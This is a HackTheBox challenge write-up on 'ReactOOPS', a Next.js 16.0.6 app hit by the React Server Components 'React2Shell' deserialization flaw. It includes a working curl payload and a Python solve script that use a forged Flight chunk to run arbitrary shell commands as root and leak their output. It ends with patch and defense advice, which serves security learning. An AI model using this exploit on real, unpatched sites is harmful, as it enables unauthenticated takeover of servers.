---
title: "ReactOOPS"
date: 2026-09-25 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, deserialization, react, nextjs, rce, react2shell]
description: "A polished Next.js landing page with no login, no API, and no server actions — just a version number. next 16.0.6 on React 19 ships the vulnerable React Server Components Flight parser, and one POST with a Next-Action header deserializes a forged Chunk into unauthenticated remote code execution as root."
---

## Overview

`ReactOOPS` is a Very Easy HackTheBox **Web** challenge: "NexusAI", a slick AI-assistant marketing page. The whole app is a single static `app/page.tsx` — no login form, no API route, no server action. The only thing the developer can be blamed for is the one line they didn't write: `package.json` pins **`next: 16.0.6` + `react: ^19`**. That release of Next.js's App Router ships the vulnerable React Server Components runtime, so the page is an unauthenticated remote-code-execution target via [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) / [CVE-2025-66478](https://nvd.nist.gov/vuln/detail/CVE-2025-66478) — "React2Shell". The package is even named `react2shell` in case the hint was too subtle.

## The technique

React Server Components (RSC) talk to the browser over a wire format called the **Flight protocol**: the server streams "Chunk" objects and the runtime *reconstructs* them from incoming data. The bug is an [insecure deserialization](https://cwe.mitre.org/data/definitions/502.html) ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) — the decoder trusts attacker-controlled Chunk objects without validating them, and honors dangerous keys like `__proto__` and internal response state ([CWE-1321](https://cwe.mitre.org/data/definitions/1321.html) prototype pollution is the gadget).

The trigger is tiny: a `POST /` carrying **any** `Next-Action` header makes the server deserialize whatever Flight payload sits in the body. Default `create-next-app` production builds are vulnerable with zero developer code, at near-100% reliability.

Fingerprinting a live target is just response headers + HTML:

```bash
curl -sD - http://TARGET:PORT/ -o /dev/null | grep -iE 'x-powered-by|vary'
# X-Powered-By: Next.js
# Vary: rsc, next-router-state-tree, next-router-prefetch, ...
```

`X-Powered-By: Next.js`, `Vary: rsc`, and an inline `self.__next_f.push(...)` Flight stream in the page source confirm an App Router app on React 19.

## Solution

We submit a forged **already-resolved** Chunk as multipart field `"0"`, with field `"1"` = `"$@0"` to kick off resolution:

- `then: "$1:__proto__:then"` — when React resolves our "thenable", this walks the prototype chain and hands control to attacker-chosen code.
- `value: "{\"then\":\"$B0\"}"` — routes resolution through a Blob handler (`$B`) reference.
- `_formData.get: "$1:constructor:constructor"` — resolves to the `Function` constructor, an arbitrary-code factory.
- `_response._prefix` — the JavaScript string that factory executes **on the server**.

Plain `execSync` would be blind, so the injected JS throws an `Error('NEXT_REDIRECT')` with the command's stdout stuffed into `.digest`. Next.js serializes redirect digests into the JSON error it returns — so the response body literally contains the command output.

A single self-contained request (the RSC tokens `$1`/`$B0`/`$@0` are single-quoted so the shell doesn't expand them):

```sh
curl -s -H 'Next-Action: x' \
  -F '0={"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"throw Object.assign(new Error(`NEXT_REDIRECT`),{digest:process.mainModule.require(`child_process`).execSync(`cat /app/flag.txt`).toString()});","_formData":{"get":"$1:constructor:constructor"}}}' \
  -F '1="$@0"' \
  http://TARGET:PORT/
```

The durable artifact is `solve.py`, which wraps the same payload and pulls the output back out of the digest:

```python
import sys, re, json, requests

TARGET = sys.argv[1]
CMD    = sys.argv[2] if len(sys.argv) > 2 else "id"

prefix = ("var res = process.mainModule.require('child_process')"
          ".execSync('%s',{'timeout':5000}).toString().trim();"
          "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});" % CMD)

chunk = {"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1,
         "value": "{\"then\":\"$B0\"}",
         "_response": {"_prefix": prefix,
                       "_formData": {"get": "$1:constructor:constructor"}}}

files   = {"0": (None, json.dumps(chunk)), "1": (None, '"$@0"')}
headers = {"Next-Action": "x"}            # any value trips the vulnerable path

r = requests.post(TARGET + "/", files=files, headers=headers, timeout=15)
m = re.search(r'"digest":"([^"]+)"', r.text)   # output rides back in the redirect digest
print(m.group(1) if m else r.text[:800])
```

```bash
$ python3 solve.py http://TARGET:PORT id
uid=0(root) gid=0(root) groups=0(root),...        # RCE as root

$ python3 solve.py http://TARGET:PORT "cat /app/flag.txt"
HTB{...}
```

The Node server runs as **root** inside the container, so the deserialization gives root RCE outright. Flag value redacted.

## Why it worked

The RSC decoder treated a *user-supplied* object as a trusted internal Chunk. Because JavaScript is duck-typed, a plain object with the right shape (`then`, `status`, `_response`) is accepted as a real thenable/Chunk, and `__proto__` + `constructor.constructor` provide a clean path from "deserialize JSON" straight to `Function(jsString)()`. No authentication, no developer code, one request.

## Fix / defense

- **Patch:** upgrade to Next.js **16.0.7+** (or the patched 15.x line ≥ 15.5.7) and React **19.2.1+**. The fix validates Chunk objects during Flight decoding and refuses attacker-set `__proto__`/internal-state keys.
- **Defense in depth:** WAF-block `POST` requests carrying a `Next-Action` header to routes with no Server Action; never run the Node server as root; and deserialize only schema-validated data ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)).
